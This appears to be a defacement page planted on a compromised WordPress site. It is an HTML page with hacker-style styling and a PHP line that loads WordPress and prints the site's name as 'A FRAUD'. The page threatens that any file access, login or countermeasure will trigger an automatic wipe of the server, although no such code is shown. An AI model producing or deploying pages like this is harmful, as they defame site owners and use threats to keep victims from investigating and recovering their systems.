<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM BREACH ALERT</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            overflow: hidden;
        }
        
        .warning {
            color: #ff0000;
            font-size: 36px;
            text-align: center;
            margin: 20px;
            animation: blink 1s infinite;
        }
        
        .hacker-name {
            color: #ff0000;
            font-size: 48px;
            text-align: center;
            animation: glitch 0.5s infinite;
        }
        
        .countdown {
            font-size: 24px;
            text-align: center;
            margin: 20px;
        }
        
        .message {
            font-size: 18px;
            line-height: 1.6;
            margin: 30px auto;
            max-width: 800px;
            text-align: center;
        }
        
        .critical-warning {
            color: #ff0000;
            font-size: 20px;
            line-height: 1.6;
            margin: 30px auto;
            max-width: 800px;
            text-align: center;
        }
        
        @keyframes blink {
            0% {opacity: 0;}
            50% {opacity: 1;}
            100% {opacity: 0;}
        }
        
        @keyframes glitch {
            0% {transform: translate(0);}
            20% {transform: translate(-2px, 2px);}
            40% {transform: translate(-2px, -2px);}
            60% {transform: translate(2px, 2px);}
            80% {transform: translate(2px, -2px);}
            100% {transform: translate(0);}
        }
        
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.1;
            z-index: -1;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.2) 0px,
                rgba(0, 255, 0, 0.2) 1px,
                transparent 1px,
                transparent 2px
            );
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    
    <div class="warning">⚠ SYSTEM COMPROMISED ⚠</div>
    
    <div class="hacker-name">ATTENTION USERS<br><?php require_once('wp-load.php'); echo get_bloginfo( 'name' ); ?> IS A FRAUD</div>
    
    <div class="message">
        <strong>SCAM ALERT:</strong><br>
        This system is breached due to scams.
    </div>
    
    <div class="critical-warning">
        <strong>CRITICAL WARNING:</strong><br>
        <strong>DO NOT TRY TO ACCESS ANY FILES:</strong><br>
        If you access any server files from a different IP, our automated deletion process will start immediately, wiping all server files. Do not modify or open any files or folders. Our watcher will trigger automatically if you attempt to do so.
    </div>
    
    <div class="critical-warning">
        <strong>ADDITIONAL WARNING:</strong><br>
        Do not attempt to log into your accounts or engage in any countermeasures. Unauthorized actions will trigger irreversible data wipe.
    </div>
</body>
</html>
